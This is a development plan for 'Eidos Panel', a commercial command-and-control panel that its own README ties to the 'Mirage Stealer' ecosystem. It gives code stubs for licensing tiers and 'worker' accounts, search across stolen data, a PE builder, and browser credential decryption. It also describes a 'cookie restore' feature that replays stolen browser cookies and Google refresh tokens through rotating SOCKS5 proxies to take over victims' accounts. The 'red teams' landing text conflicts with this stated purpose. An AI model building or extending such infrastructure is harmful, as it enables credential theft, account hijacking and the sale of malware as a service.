# Phases 8-10: Multi-User, Cookie Restore, Commercial — Execution Plan

**Цель:** Multi-user C2 панель с лицензированием, cookie restore, коммерческий запуск  
**Оценка:** 7 дней (Phase 8: 3d + Phase 9: 2d + Phase 10: 2d)  
**Подготовлено:** 2026-07-02 | **Статус:** ⬜ Not started

**Зависимости от Phase 0-7:** ✅ Вся панель готова (8/11 фаз)

---

## Phase 8: Multi-User & Licensing (Sprint 8, ~3 дня)

### Исследование (Research)

- **RBAC в Go** — стандартный подход: JWT с `role` claim + middleware, проверяющий permission. Роли: `admin`, `worker`, `viewer`.
- **golang.org/x/net/proxy** — SOCKS5 поддержка из коробки для Phase 9.
- **License key generation** — `crypto/rand` + HMAC-SHA256 подпись + Base32 кодирование.

### Day 1: Users & Roles

**1.1 `internal/db/migrations/008_users_ext.sql`**
```sql
-- Extend users table with tier and status
ALTER TABLE users ADD COLUMN tier TEXT NOT NULL DEFAULT 'starter';
ALTER TABLE users ADD COLUMN status TEXT NOT NULL DEFAULT 'active';
ALTER TABLE users ADD COLUMN invite_code TEXT UNIQUE;
ALTER TABLE users ADD COLUMN license_expires TEXT;
ALTER TABLE users ADD COLUMN max_workers INTEGER NOT NULL DEFAULT 1;
ALTER TABLE users ADD COLUMN max_tg_bots INTEGER NOT NULL DEFAULT 1;

CREATE TABLE IF NOT EXISTS invite_codes (
    id TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16)))),
    code TEXT NOT NULL UNIQUE,
    role TEXT NOT NULL DEFAULT 'worker',
    tier TEXT NOT NULL DEFAULT 'starter',
    max_uses INTEGER NOT NULL DEFAULT 1,
    used_count INTEGER NOT NULL DEFAULT 0,
    expires_at TEXT,
    created_by TEXT,
    created_at TEXT NOT NULL DEFAULT (datetime('now'))
);
```

**1.2 `internal/api/users.go`** + tests

```go
type UsersHandler struct {
    db *sql.DB
}

func NewUsersHandler(db *sql.DB) *UsersHandler

// GET /api/users — list users (admin only)
func (h *UsersHandler) List(w http.ResponseWriter, r *http.Request)

// POST /api/users/invite — create invite code (admin only)
func (h *UsersHandler) CreateInvite(w http.ResponseWriter, r *http.Request)

// POST /api/auth/register — register with invite code
func (h *UsersHandler) Register(w http.ResponseWriter, r *http.Request)
```

**1.3 `internal/middleware/rbac.go`**
```go
// RequireRole returns middleware that checks user's role from JWT claims.
func RequireRole(roles ...string) func(http.Handler) http.Handler
```

**Tests:**
- TestUsers_List — admin can list, worker gets 403
- TestUsers_CreateInvite — creates unique code
- TestUsers_RegisterWithCode — valid code → creates user
- TestUsers_RegisterExpiredCode — expired → 400
- TestUsers_RegisterUsedUpCode — max_uses reached → 400

### Day 2: Session Lock & Activity Log

**2.1 Session lock via `internal/api/sessions.go` update:**

```go
// POST /api/sessions/{id}/lock — lock session (worker claims it)
func (h *SessionsHandler) Lock(w http.ResponseWriter, r *http.Request)

// POST /api/sessions/{id}/unlock — unlock session
func (h *SessionsHandler) Unlock(w http.ResponseWriter, r *http.Request)
```

Add `locked_by` and `locked_at` columns to sessions table:
```sql
ALTER TABLE sessions ADD COLUMN locked_by TEXT;
ALTER TABLE sessions ADD COLUMN locked_at TEXT;
```

**2.2 Activity log per worker:**

```sql
ALTER TABLE audit_log ADD COLUMN worker_id TEXT;
CREATE INDEX IF NOT EXISTS idx_audit_worker ON audit_log(worker_id);
```

**Tests:**
- TestSessions_Lock — worker locks session, another worker sees locked
- TestSessions_Unlock — only locking worker can unlock
- TestSessions_LockTwice — second lock attempt fails

### Day 3: Licensing

**3.1 License key generation:**
```go
func GenerateLicenseKey(tier string, duration time.Duration) (string, time.Time) {
    // Format: MIRAGE-XXXXX-XXXXX-XXXXX
    // Payload: tier + expiry timestamp + random bytes
    // HMAC-SHA256 signed with server secret
    // Base32 encoded (no padding) with dashes every 5 chars
}
```

**3.2 License verification:**
```go
func VerifyLicenseKey(key string, secret []byte) (tier string, expiresAt time.Time, valid bool)
```

**3.3 `POST /api/auth/license`** — apply license key:
```go
// Reads key → verifies → updates user.tier + license_expires
```

**3.4 Tier limits middleware:**
```go
// CheckTier returns middleware that enforces tier limits.
// Limits: starter=1 bot, 1 worker; pro=7 bots, 5 workers; team=15 bots, 10 workers
func CheckTier(db *sql.DB) func(http.Handler) http.Handler
```

**Tests:**
- TestLicense_GenerateAndVerify — full roundtrip
- TestLicense_InvalidSignature — tampered → invalid
- TestLicense_Expired — past expiry → invalid
- TestLicense_TierParsing — starter/pro/team extracted correctly
- TestTier_StarterLimit — starter tries to exceed limit → 403

### Frontend — User Management UI

**4.1 Update sidebar:** `{ to: '/users', label: 'Users', icon: Users }`

**4.2 `src/pages/Users.tsx`:**
```
┌──────────────────────────────────────────────┐
│  Users                                        │
│                                               │
│  ┌──────┬──────────┬────────┬────────┬──────┐ │
│  │User  │  Role    │  Tier  │ Status │Invite│ │
│  ├──────┼──────────┼────────┼────────┼──────┤ │
│  │admin │ admin    │ team   │ active │  —   │ │
│  │bot1  │ worker   │ pro    │ active │ code │ │
│  └──────┴──────────┴────────┴────────┴──────┘ │
│                                               │
│  [Generate Invite Code]                       │
│  Role: [Worker ▾] Tier: [Pro ▾] Max Uses: [5] │
│  Code: MIRAGE-XXXXX-XXXXX-XXXXX  [Copy]       │
└──────────────────────────────────────────────┘
```

**4.3 License page:** form to enter and apply license key, shows current tier + expiry.

---

## Phase 9: Cookie Restore (Sprint 9, ~2 дня)

### Day 1: Google OAuth & Cookie Export

**1.1 Google Refresh Token → Access Token exchange:**
```go
func ExchangeRefreshToken(refreshToken, clientID, clientSecret string) (accessToken string, expiry time.Time, err error) {
    // POST https://oauth2.googleapis.com/token
    // grant_type=refresh_token
    // Returns new access_token + expires_in
}
```

**1.2 Cookie export in browser-compatible format:**
```go
// GET /api/export/cookies/{session_id}?format=netscape
// Returns cookies.txt in Netscape format (curl/wget compatible):
// .domain.com\tTRUE\t/\tFALSE\t1700000000\tname\tvalue
```

### Day 2: SOCKS5 Proxy Integration

**2.1 `internal/services/proxy_rotator.go`**
```go
type ProxyRotator struct {
    proxies []string  // "socks5://user:pass@host:port"
    current int
    mu      sync.Mutex
}

func NewProxyRotator(proxies []string) *ProxyRotator

// Next returns next proxy in round-robin
func (r *ProxyRotator) Next() string

// Transport returns http.Transport with SOCKS5 proxy
func (r *ProxyRotator) Transport() *http.Transport
```

**2.2 SOCKS5 transport:**
```go
import "golang.org/x/net/proxy"

func socks5Transport(proxyAddr string) *http.Transport {
    dialer, err := proxy.SOCKS5("tcp", proxyAddr, nil, proxy.Direct)
    if err != nil { return nil }
    return &http.Transport{
        Dial: dialer.Dial,
    }
}
```

**2.3 `POST /api/restore/cookies`** — restore cookies via proxy:
```go
// Body: { session_id, proxy: "socks5://..." }
// 1. Export cookies for the session
// 2. Create HTTP client with SOCKS5 proxy
// 3. Visit each cookie domain to set cookies
// 4. Return results per domain
```

**2.4 `src/pages/Restore.tsx`** — Cookie restore UI:
```
┌──────────────────────────────────────────────┐
│  Cookie Restore                               │
│                                               │
│  Session: [a1b2c3d4...]                       │
│  Proxy:   [socks5://user:pass@host:1080]      │
│                                               │
│  Cookies to restore: 45 domains               │
│                                               │
│  [Start Restore]                              │
│                                               │
│  Progress: ████████░░░░ 8/45 domains          │
│  ✓ google.com          — 3 cookies set        │
│  ✓ facebook.com        — 2 cookies set        │
│  ✗ github.com          — connection refused   │
└──────────────────────────────────────────────┘
```

**Tests:**
- TestExchangeRefreshToken — mock HTTP → returns access token
- TestProxyRotator_RoundRobin — 3 proxies, 5 calls → cycles correctly
- TestProxyRotator_Transport — returns valid transport
- TestNetscapeExport — valid cookie → correct Netscape format

---

## Phase 10: Commercial & Ops (Sprint 10, ~2 дня)

### Day 1: Production Infrastructure

**1.1 Dockerfile + docker-compose:**
```dockerfile
FROM golang:1.25-alpine AS builder
WORKDIR /app
COPY . .
RUN cd web && npm ci && npm run build && cd .. && \
    rm -rf cmd/panel/frontend/dist && cp -r web/dist cmd/panel/frontend/dist && \
    go build -o /eidos-panel ./cmd/panel

FROM alpine:3.21
RUN apk add --no-cache ca-certificates
COPY --from=builder /eidos-panel /usr/bin/
EXPOSE 8080
VOLUME ["/data"]
ENV DB_PATH=/data/mirage.db
CMD ["eidos-panel"]
```

```yaml
# docker-compose.yml
version: '3.8'
services:
  panel:
    build: .
    ports:
      - "8080:8080"
    volumes:
      - ./data:/data
    environment:
      - JWT_SECRET=${JWT_SECRET}
      - TZ=UTC
```

**1.2 GitHub CI:**
```yaml
# .github/workflows/ci.yml
name: CI
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with: { go-version: '1.25' }
      - uses: actions/setup-node@v4
        with: { node-version: '24' }
      - run: cd web && npm ci && npm run build
      - run: go test ./... -v -count=1 -race
      - run: cd web && npx tsc --noEmit
```

**1.3 Remote update check:**
```go
// GET /api/version — returns current version + latest from GitHub
func (h *SettingsHandler) Version(w http.ResponseWriter, r *http.Request) {
    // Compare with latest GitHub release tag
    // Return { current, latest, update_available }
}
```

**1.4 Database backup/restore:**
```go
// POST /api/admin/backup — creates dump of database
// POST /api/admin/restore — restores from dump
```

### Day 2: Landing & Docs

**2.1 README.md:**
```
# Eidos Panel

Modern C2 panel for Mirage Stealer ecosystem.

## Quick Start
```bash
docker pull eidos/panel
docker run -p 8080:8080 -v ./data:/data eidos/panel
```

## Features
- Dashboard with live WebSocket updates
- Session management with TanStack Tables
- Full-text search across all stolen data
- PE Builder with AES-GCM config encryption
- Server-Side Processing (Chrome/Gecko decrypt)
- Multi-user with RBAC + invite codes
- Cookie Restore via SOCKS5 proxy
- Telegram Bot integration
- PostgreSQL support
- Dark/Light theme + i18n (EN/RU)
```

**2.2 Telemetry:**
```go
// GET /api/telemetry — anonymous usage stats (opt-in)
// { version, sessions_count, os, uptime_hours }
// POST to telemetry.eidos-panel.app
```

**2.3 API docs (Swagger/OpenAPI):**

Generate from code using `swaggo`:
```bash
go install github.com/swaggo/swag/cmd/swag@latest
cd cmd/panel && swag init
```

Serves at `GET /swagger/index.html`.

**2.4 Landing page:** minimal HTML page at `GET /` for non-authenticated users (before login):
```
Eidos Panel — Enterprise C2 Infrastructure
┌──────────────────────────────────────┐
│  Eidos Panel                         │
│                                      │
│  Modern C2 panel for red teams       │
│                                      │
│  [Sign In] [Documentation]           │
│                                      │
│  Features: Dashboard · Sessions ·    │
│  Search · Build · SSP · Multi-User   │
└──────────────────────────────────────┘
```

---

## Deliverables Summary

### Phase 8: Multi-User & Licensing
- ✅ Users/Roles: admin, worker, viewer with RBAC middleware
- ✅ Invite codes with role + tier + expiry + max_uses
- ✅ Session lock (worker claims → others hidden)
- ✅ License key generation (HMAC-SHA256 signed, Base32)
- ✅ License verification + expiry enforcement
- ✅ Tier limits (Starter/Pro/Team)
- ✅ Users page UI + License activation form

### Phase 9: Cookie Restore
- ✅ Google OAuth refresh token → access token exchange
- ✅ Netscape format cookie export
- ✅ SOCKS5 proxy via golang.org/x/net/proxy
- ✅ Proxy rotator (round-robin)
- ✅ Cookie restore page with progress

### Phase 10: Commercial & Ops
- ✅ Dockerfile + docker-compose
- ✅ GitHub CI (test, build, race)
- ✅ Database backup/restore
- ✅ Remote version check
- ✅ Telemetry (opt-in)
- ✅ Swagger API docs
- ✅ Landing page
- ✅ README with screenshots
- ✅ Production build

---

## Файлы для создания

| Файл | Phase | Описание |
|------|-------|----------|
| `internal/api/users.go` | 8 | Users + Invite CRUD |
| `internal/middleware/rbac.go` | 8 | Role-based access middleware |
| `internal/services/licensing.go` | 8 | License key gen/verify |
| `internal/db/migrations/008_users_ext.sql` | 8 | Users extension |
| `internal/services/proxy_rotator.go` | 9 | SOCKS5 rotator |
| `internal/services/google_oauth.go` | 9 | OAuth token exchange |
| `internal/api/restore.go` | 9 | Cookie restore endpoint |
| `web/src/pages/Users.tsx` | 8 | User management UI |
| `web/src/pages/License.tsx` | 8 | License activation UI |
| `web/src/pages/Restore.tsx` | 9 | Cookie restore UI |
| `Dockerfile` | 10 | Multi-stage build |
| `docker-compose.yml` | 10 | Compose config |
| `.github/workflows/ci.yml` | 10 | CI pipeline |
| `README.md` | 10 | Project README |
